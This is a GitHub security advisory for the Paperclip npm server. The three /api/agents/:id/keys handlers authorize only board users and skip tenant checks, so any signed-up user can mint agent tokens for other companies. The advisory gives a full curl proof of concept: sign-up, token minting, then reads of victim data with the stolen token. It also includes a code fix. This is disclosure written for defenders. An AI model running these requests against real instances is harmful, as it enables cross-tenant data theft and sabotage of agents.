# [C] Paperclip: Cross-tenant agent API token minting via missing assertCompanyAccess on /api/agents/:id/keys

## Summary
Severity: Critical
Advisory: GHSA-47wq-cj9q-wpmp
CWE: CWE-1220, CWE-285, CWE-639, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-47wq-cj9q-wpmp
Type: github-advisory

## Affected
- npm: `@paperclipai/server` — affected >=0 <2026.416.0

## Details
<img width="7007" height="950" alt="01-setup" src="https://github.com/user-attachments/assets/1596b8d1-8de5-4c21-b1d2-2db41b568d7e" />

> Isolated paperclip instance running in authenticated mode (default config)
> on a clean Docker image matching commit b649bd4 (2026.411.0-canary.8, post
> the 2026.410.0 patch). This advisory was verified on an unmodified build.

### Summary

`POST /api/agents/:id/keys`, `GET /api/agents/:id/keys`, and
`DELETE /api/agents/:id/keys/:keyId` (`server/src/routes/agents.ts`
lines 2050-2087) only call `assertBoard` to authorize the caller. They never
call `assertCompanyAccess` and never verify that the caller is a member of the
company that owns the target agent.

Any authenticated board user (including a freshly signed-up account with zero
company memberships and no `instance_admin` role) can mint a plaintext
`pcp_*` agent API token for any agent in any company on the instance. The
minted token is bound to the **victim** agent's `companyId` server-side, so
every downstream `assertCompanyAccess` check on that token authorizes
operations inside the victim tenant.

This is a pure authorization bypass on the core tenancy boundary. It is
distinct from GHSA-68qg-g8mg-6pr7 (the unauth import → RCE chain disclosed in
2026.410.0): that advisory fixed one handler, this report is a different
handler with the same class of mistake that the 2026.410.0 patch did not
cover.

### Root Cause

`server/src/routes/agents.ts`, lines 2050-2087:

```ts
router.get("/agents/:id/keys", async (req, res) => {
  assertBoard(req);                             // <-- no assertCompanyAccess
  const id = req.params.id as string;
  const keys = await svc.listKeys(id);
  res.json(keys);
});

router.post("/agents/:id/keys", validate(createAgentKeySchema), async (req, res) => {
  assertBoard(req);                             // <-- no assertCompanyAccess
  const id = req.params.id as string;
  const key = await svc.createApiKey(id, req.body.name);
  ...
  res.status(201).json(key);                    // returns plaintext `token`
});

router.delete("/agents/:id/keys/:keyId", async (req, res) => {
  assertBoard(req);                             // <-- no assertCompanyAccess
  const keyId = req.params.keyId as string;
  const revoked = await svc.revokeKey(keyId);
  ...
});
```

Compare the handler 12 lines below, `router.post("/agents/:id/wakeup")`,
which shows the correct pattern: it fetches the agent, then calls
`assertCompanyAccess(req, agent.companyId)`. The three `/keys` handlers above
do not even fetch the agent.

The token returned by `POST /agents/:id/keys` is bound to the **victim**
company in `server/src/services/agents.ts`, lines 580-609:

```ts
createApiKey: async (id: string, name: string) => {
  const existing = await getById(id);                 // victim agent
  ...
  const token = createToken();
  const keyHash = hashToken(token);
  const created = await db
    .insert(agentApiKeys)
    .values({
      agentId: id,
      companyId: existing.companyId,                  // <-- victim tenant
      name,
      keyHash,
    })
    .returning()
    .then((rows) => rows[0]);

  return {
    id: created.id,
    name: created.name,
    token,                                            // <-- plaintext returned
    createdAt: created.createdAt,
  };
},
```

`actorMiddleware` (`server/src/middleware/auth.ts`) then resolves the bearer
token to `actor = { type: "agent", companyId: existing.companyId }`, so every
subsequent `assertCompanyAccess(req, victim.companyId)` check passes.

The exact same `assertBoard`-only pattern is also present on agent lifecycle
handlers in the same file (`POST /agents/:id/pause`, `/resume`, `/terminate`,
and `DELETE /agents/:id` at lines 1962, 1985, 2006, 2029). An attacker can
terminate, delete, or silently pause any agent in any company with the same
primitive.

### Trigger Conditions

1. Paperclip running in `authenticated` mode (the public, multi-user
   configuration — `PAPERCLIP_DEPLOYMENT_MODE=authenticated`).
2. `PAPERCLIP_AUTH_DISABLE_SIGN_UP` unset or false (the default — same
   default precondition as GHSA-68qg-g8mg-6pr7).
3. At least one other company exists on the instance with at least one
   agent. In practice this is the normal state of any production paperclip
   deployment. The attacker needs the victim agent's ID, which leaks through
   activity feeds, heartbeat run APIs, and the sidebar-badges endpoint that
   the 2026.410.0 disclosure also flagged as under-protected.

No admin role, no invite, no email verification, no CSRF dance. The attacker
is an authenticated browser-session user with zero company memberships.

### PoC

Verified against a freshly built `ghcr.io/paperclipai/paperclip:latest`
container at commit `b649bd4` (2026.411.0-canary.8, which is **post** the
2026.410.0 import-bypass patch). Full 5-step reproduction:

<img width="5429" height="1448" alt="02-signup" src="https://github.com/user-attachments/assets/4c2b2939-326b-4e0d-aa01-05e22851486b" />
> Step 1-2: Mallory signs up via the default `/api/auth/sign-up/email` flow
> (no invite, no verification) and confirms via `GET /api/companies` that she
> is a member of zero companies. She has no tenant access through the normal
> authorization path.

```bash
# Step 1: attacker signs up as an unprivileged board user
curl -s -X POST http://<target>:3102/api/auth/sign-up/email \
  -H 'Content-Type: application/json' \
  -d '{"email":"mallory@attacker.com","password":"P@ssw0rd456","name":"mallory"}'
# Save the `better-auth.session_token` cookie from Set-Cookie.

# Step 2: confirm zero company membership
curl -s -H "Cookie: $MALLORY_SESSION" http://<target>:3102/api/companies
# -> []
```

<img width="2891" height="1697" alt="03-exploit" src="https://github.com/user-attachments/assets/c097e861-6bc9-4f6a-841c-b45501e27849" />
> Step 3 — the vulnerability. Mallory POSTs to `/api/agents/:id/keys`
> targeting an agent in Victim Corp (a company she is NOT a member of). The
> server returns a plaintext `pcp_*` token tied to the victim's `companyId`.
> There is no authorization error. `assertBoard` passed because Mallory is a
> board user; `assertCompanyAccess` was never called.

```bash
# Step 3: mint a plaintext token for a victim agent
VICTIM_AGENT=<any-agent-id-in-another-company>
curl -s -X POST \
  -H "Cookie: $MALLORY_SESSION" \
  -H "Origin: http://<target>:3102" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwnkit"}' \
  http://<target>:3102/api/agents/$VICTIM_AGENT/keys
# -> 201 { "id":"...", "token":"pcp_8be3a5198e9ccba0ac7b3341395b2d3145fe2caa1b800e25", ... }
```

<img width="2983" height="2009" alt="04-exfil" src="https://github.com/user-attachments/assets/ede5d469-4119-432c-b0ae-5a4fabc9a56b" />
> Step 4-5: Use the stolen token as a Bearer credential. `actorMiddleware`
> resolves it to `actor = { type: "agent", companyId: VICTIM }`, so every
> downstream `assertCompanyAccess` gate authorizes reads against Victim Corp.
> Mallory can now enumerate the victim's company metadata, issues, approvals,
> and agent configuration — none of which she had access to 30 seconds ago.

```bash
# Step 4: use the stolen token to read victim company data
STOLEN=pcp_8be3a5198e9ccba0ac7b3341395b2d3145fe2caa1b800e25
VICTIM_CO=<victim-company-id>
curl -s -H "Authorization: Bearer $STOLEN" \
  http://<target>:3102/api/companies/$VICTIM_CO
# -> 200 { "id":"...", "name":"Victim Corp", ... }

curl -s -H "Authorization: Bearer $STOLEN" \
  http://<target>:3102/api/companies/$VICTIM_CO/issues
# -> 200 [ ...every issue in the victim tenant... ]

curl -s -H "Authorization: Bearer $STOLEN" \
  http://<target>:3102/api/companies/$VICTIM_CO/approvals
# -> 200 [ ...every approval in the victim tenant... ]

curl -s -H "Authorization: Bearer $STOLEN" \
  http://<target>:3102/api/agents/$VICTIM_AGENT
# -> 200 { ...full agent config incl. adapter settings... }
```

Observed outputs (all verified on live instance at time of submission):

- `POST /api/agents/:id/keys` → **201** with plaintext `token` bound to
  the victim's `companyId`
- `GET /api/companies/:victimId` → **200** full company metadata
- `GET /api/companies/:victimId/issues` → **200** issue list
- `GET /api/companies/:victimId/agents` → **200** agent list
- `GET /api/companies/:victimId/approvals` → **200** approval list

### Impact

- **Type:** Broken access control / cross-tenant IDOR (CWE-285, CWE-639,
  CWE-862, CWE-1220)
- **Who is impacted:** every paperclip instance running in `authenticated`
  mode with default `PAPERCLIP_AUTH_DISABLE_SIGN_UP` (open signup). That is
  the documented multi-user configuration and the default in
  `docker/docker-compose.quickstart.yml`.
- **Confidentiality:** HIGH. Any signed-up user can read another tenant's
  company metadata, issues, approvals, runs, and agent configuration (which
  includes adapter URLs, model settings, and references to stored secret
  bindings).
- **Integrity:** HIGH. The minted token is a persistent agent credential
  that authenticates for every `assertCompanyAccess`-gated agent-scoped
  mutation in the victim tenant (issue/run updates, self-wakeup with
  attacker-controlled payloads, adapter execution via the agent's own
  adapter, etc.).
- **Availability:** HIGH. The attacker can `pause`, `terminate`, or
  `DELETE` any agent in any company via the sibling `assertBoard`-only
  handlers (`/agents/:id/pause`, `/resume`, `/terminate`,
  `DELETE /agents/:id`).
- **Relation to GHSA-68qg-g8mg-6pr7:** the 2026.410.0 patch added
  `assertInstanceAdmin` on `POST /companies/import` and closed the disclosed
  chain, but the same root cause (`assertBoard` treated as sufficient where
  `assertCompanyAccess` is required on a cross-tenant resource, or where
  `assertInstanceAdmin` is required on an instance-global resource) is
  present in multiple other handlers. The import fix did not audit sibling
  routes. This report is an instance of that same class the prior advisory
  did not cover.

Severity is driven by the fact that every precondition is default, the bug
is reachable by any signed-up user with zero memberships, and the stolen
token persists across sessions until manually revoked.

### Suggested Fix

In `server/src/routes/agents.ts`, replace each of the three `/keys` handlers
so they load the target agent first and enforce company access:

```ts
router.get("/agents/:id/keys", async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  const agent = await svc.getById(id);
  if (!agent) {
    res.status(404).json({ error: "Agent not found" });
    return;
  }
  assertCompanyAccess(req, agent.companyId);
  const keys = await svc.listKeys(id);
  res.json(keys);
});

router.post("/agents/:id/keys", validate(createAgentKeySchema), async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  const agent = await svc.getById(id);
  if (!agent) {
    res.status(404).json({ error: "Agent not found" });
    return;
  }
  assertCompanyAccess(req, agent.companyId);
  const key = await svc.createApiKey(id, req.body.name);
  ...
});

router.delete("/agents/:id/keys/:keyId", async (req, res) => {
  assertBoard(req);
  const keyId = req.params.keyId as string;
  // Look up the key to find its agentId/companyId, then:
  const key = await svc.getKeyById(keyId);
  if (!key) { res.status(404).json({ error: "Key not found" }); return; }
  assertCompanyAccess(req, key.companyId);
  await svc.revokeKey(keyId);
  res.json({ ok: true });
});
```

While fixing this, audit the sibling lifecycle handlers at lines 1962-2048
(`/agents/:id/pause`, `/resume`, `/terminate`, `DELETE /agents/:id`) which
share the same bug.

Defense in depth: consider a code-wide sweep for `assertBoard(req)` calls
that are not immediately followed by `assertCompanyAccess` or
`assertInstanceAdmin` — the 2026.410.0 patch focused on one handler but the
pattern is systemic.

### Patch Status

- Latest image at time of writing: `ghcr.io/paperclipai/paperclip:latest`
  digest `sha256:baa9926e...`, commit `b649bd4`
  (`canary/v2026.411.0-canary.8`), which is *after* the 2026.410.0 import
  bypass fix.
- The bug is still present on that revision. PoC reproduced end-to-end
  against an unmodified container.

### Credits

Discovered by [pwnkit](https://github.com/peaktwilight/pwnkit), an
AI-assisted security scanner, during variant-hunt analysis of
GHSA-68qg-g8mg-6pr7. Manually verified against a live isolated paperclip
instance.

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-47wq-cj9q-wpmp
- https://github.com/paperclipai/paperclip
